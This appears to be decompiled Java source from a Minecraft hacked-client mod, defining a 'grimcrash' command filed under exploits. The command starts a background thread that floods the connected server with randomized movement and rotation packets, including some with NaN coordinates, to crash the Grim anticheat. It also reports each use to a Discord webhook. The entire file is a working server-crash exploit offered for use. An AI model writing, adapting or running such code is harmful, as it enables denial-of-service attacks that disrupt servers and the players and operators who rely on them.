package org.jon.magicclient.client.commands;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import net.minecraft.class_310;
import net.minecraft.class_2828.class_2829;
import net.minecraft.class_2828.class_2830;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.MessageHelper;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionType;
import org.jon.magicclient.client.utils.OptionUtil;

public class Grimcrash implements Command {
   private final AtomicBoolean isActive = new AtomicBoolean(false);
   private final Random random = new Random();
   private Thread crashThread;
   private final AtomicInteger packetCounter = new AtomicInteger(0);
   private final AtomicInteger simulationFails = new AtomicInteger(0);
   private final AtomicInteger tickTimerFails = new AtomicInteger(0);
   private final MessageHelper msgHelper = new MessageHelper();
   private int power = 1;

   public String getName() {
      return "grimcrash";
   }

   public String getDescription() {
      return "Grim Anticheat crash with movement simulation and NaN bypass";
   }

   public String getArgsUsage() {
      return "[power|status]";
   }

   public boolean getEnabled() {
      return this.isActive.get();
   }

   public void setEnabled(boolean bool) {
      if (!bool && this.isActive.get()) {
         this.stopCrash();
      }

   }

   public List<OptionUtil> getOptions() {
      List<OptionUtil> options = new ArrayList();
      OptionUtil powerOpt = new OptionUtil("Power", OptionType.INTEGER);
      powerOpt.setValue(this.power);
      options.add(powerOpt);
      return options;
   }

   public GuiCategory getCategory() {
      return GuiCategory.EXPLOITS;
   }

   public void onCommand(String[] args) {
      if (args.length == 1) {
         try {
            this.power = (Integer)((OptionUtil)this.getOptions().get(0)).getValue();
         } catch (Exception var4) {
         }
      } else if (args.length > 1) {
         if (args[1].equalsIgnoreCase("status")) {
            this.msgHelper.sendMessage("§6[GrimCrash] Status:", true);
            this.msgHelper.sendMessage("§7Packets Sent: §f" + this.packetCounter.get(), true);
            this.msgHelper.sendMessage("§7Simulation Fails: §f" + this.simulationFails.get(), true);
            this.msgHelper.sendMessage("§7TickTimer Fails: §f" + this.tickTimerFails.get(), true);
            return;
         }

         try {
            this.power = Math.max(1, Integer.parseInt(args[1]));
         } catch (NumberFormatException var3) {
         }
      }

      if (this.isActive.get()) {
         this.stopCrash();
         this.msgHelper.sendMessage("§c[GrimCrash] Stopped!", true);
      } else {
         this.startCrash();
      }

   }

   private void startCrash() {
      class_310 client = class_310.method_1551();
      if (client != null && client.field_1724 != null && client.method_1562() != null) {
         this.isActive.set(true);
         this.packetCounter.set(0);
         this.simulationFails.set(0);
         this.tickTimerFails.set(0);
         this.msgHelper.sendMessage("§a[GrimCrash] Starting with power " + this.power + "...", true);
         DiscordWebhookSender.sendCrasherActivation("grimcrasher", "Power=" + this.power);
         this.crashThread = new Thread(() -> {
            try {
               class_310 c = class_310.method_1551();

               while(this.isActive.get() && c.field_1724 != null && c.method_1562() != null) {
                  if (c.field_1724 == null || c.method_1562() == null) {
                     System.out.println("[Grimcrash] Player disconnected - stopping crash");
                     this.msgHelper.sendMessage("§c[Grimcrash] Stopped - disconnected from server", true);
                     this.isActive.set(false);
                     return;
                  }

                  for(int p = 0; p < this.power && this.isActive.get(); ++p) {
                     if (c.field_1724 == null || c.method_1562() == null) {
                        System.out.println("[Grimcrash] Connection lost - stopping crash");
                        this.msgHelper.sendMessage("§c[Grimcrash] Stopped - connection lost", true);
                        this.isActive.set(false);
                        return;
                     }

                     double baseX = c.field_1724.method_23317();
                     double baseY = c.field_1724.method_23318();
                     double baseZ = c.field_1724.method_23321();
                     float yaw = c.field_1724.method_36454();
                     float pitch = c.field_1724.method_36455();
                     boolean onGround = c.field_1724.method_24828();

                     try {
                        if (this.random.nextFloat() < 0.7F) {
                           double x = baseX + (this.random.nextDouble() - 0.5D) * 10.0D;
                           double y = baseY + (this.random.nextBoolean() ? 0.1D : -0.1D);
                           double z = baseZ + (this.random.nextDouble() - 0.5D) * 10.0D;
                           c.method_1562().method_2883(new class_2829(x, y, z, onGround));
                           if (this.random.nextInt(100) < 5) {
                              this.simulationFails.incrementAndGet();
                              c.method_1562().method_2883(new class_2829(Double.NaN, Double.NaN, Double.NaN, onGround));
                           }
                        } else {
                           c.method_1562().method_2883(new class_2830(baseX, baseY, baseZ, yaw + (this.random.nextFloat() - 0.5F) * 10.0F, pitch + (this.random.nextFloat() - 0.5F) * 5.0F, onGround));
                           if (this.random.nextInt(100) < 3) {
                              this.tickTimerFails.incrementAndGet();

                              for(int i = 0; i < 5; ++i) {
                                 c.method_1562().method_2883(new class_2830(baseX, baseY, baseZ, yaw + (this.random.nextFloat() - 0.5F) * 20.0F, pitch + (this.random.nextFloat() - 0.5F) * 10.0F, onGround));
                              }
                           }
                        }

                        this.packetCounter.incrementAndGet();
                     } catch (Exception var24) {
                        if (var24.getMessage() != null && (var24.getMessage().contains("disconnected") || var24.getMessage().contains("connection") || var24.getMessage().contains("closed"))) {
                           System.out.println("[Grimcrash] Disconnection detected - stopping crash");
                           this.msgHelper.sendMessage("§c[Grimcrash] Stopped - disconnected from server", true);
                           this.isActive.set(false);
                           return;
                        }
                     }
                  }

                  try {
                     long delay = (long)(1 + this.random.nextInt(10000));
                     Thread.sleep(Math.max(1L, delay / (long)this.power));
                  } catch (InterruptedException var23) {
                     break;
                  }
               }
            } catch (Exception var25) {
               System.out.println("[Grimcrash] Fatal error: " + var25.getMessage());
            } finally {
               this.isActive.set(false);
               System.out.println("[Grimcrash] Stopped");
            }

         }, "GrimCrash-Thread");
         this.crashThread.setDaemon(true);
         this.crashThread.start();
      } else {
         this.msgHelper.sendMessage("§c[GrimCrash] Not in-game!", true);
      }
   }

   private void stopCrash() {
      this.isActive.set(false);
      if (this.crashThread != null) {
         this.crashThread.interrupt();

         try {
            this.crashThread.join(100L);
         } catch (InterruptedException var2) {
            Thread.currentThread().interrupt();
         }

         this.crashThread = null;
      }

      DiscordWebhookSender.sendCrasherCompletion("grimcrasher", "Power=" + this.power, true);
   }
}
